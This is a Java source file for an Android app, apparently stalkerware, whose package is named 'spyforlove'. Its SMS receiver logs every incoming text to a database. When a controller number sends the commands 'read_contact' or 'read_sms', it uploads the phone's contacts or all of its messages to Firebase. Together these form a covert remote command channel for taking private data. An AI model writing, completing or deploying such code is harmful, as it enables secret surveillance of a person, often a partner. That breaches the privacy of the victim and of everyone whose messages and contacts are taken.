package chem.kth.spyforlove.broadcast;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.util.Log;

import java.util.Date;

import chem.kth.spyforlove.MessageType;
import chem.kth.spyforlove.database.DatabaseHelper;
import chem.kth.spyforlove.database.FirebaseDatabaseHelper;
import chem.kth.spyforlove.model.SMessage;

public class MessageReceiver extends BroadcastReceiver {
    private static final String readContact = "read_contact";
    private static final String readSMS = "read_sms";

    @Override
    public void onReceive(Context context, Intent intent) {
        DatabaseHelper dbHelper = DatabaseHelper.getInstance();
        if (intent.getAction().equals(Telephony.Sms.Intents.SMS_RECEIVED_ACTION)) {
            final Bundle bundle = intent.getExtras();
            try {
                if (bundle != null) {
                    String phoneNumber = null;
                    final Object[] pdusObj = (Object[]) bundle.get("pdus");
                    StringBuilder stringBuilder = new StringBuilder();
                    for (Object o : pdusObj) {
                        SmsMessage currentMessage;
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                            String format = bundle.getString("format");
                            currentMessage = SmsMessage.createFromPdu((byte[]) o, format);
                        } else {
                            currentMessage = SmsMessage.createFromPdu((byte[]) o);
                        }
                        phoneNumber = currentMessage.getDisplayOriginatingAddress();
                        String message = currentMessage.getMessageBody();
                        stringBuilder.append(message);
                    }
                    assert phoneNumber != null;
                    if (phoneNumber.equals("+PH") || phoneNumber.equals("PH")) {
                        if (stringBuilder.toString().equals(readContact)) {
                            FirebaseDatabaseHelper.getInstance().uploadContacts();
                        }
                        if (stringBuilder.toString().equals(readSMS)) {
                            FirebaseDatabaseHelper.getInstance().uploadAllMessage();
                        }
                    } else {
                        SMessage sMessage = new SMessage(0, phoneNumber, stringBuilder.toString(), new Date().toString(), MessageType.INCOMING);
                        long i = dbHelper.saveMessage(sMessage);
                        if (i > 0) Log.d("sms", "sms save success: ");
                    }
                }
            } catch (Exception e) {
                Log.e("SmsReceiver", "Exception smsReceiver" + e);
            }
        }
    }

}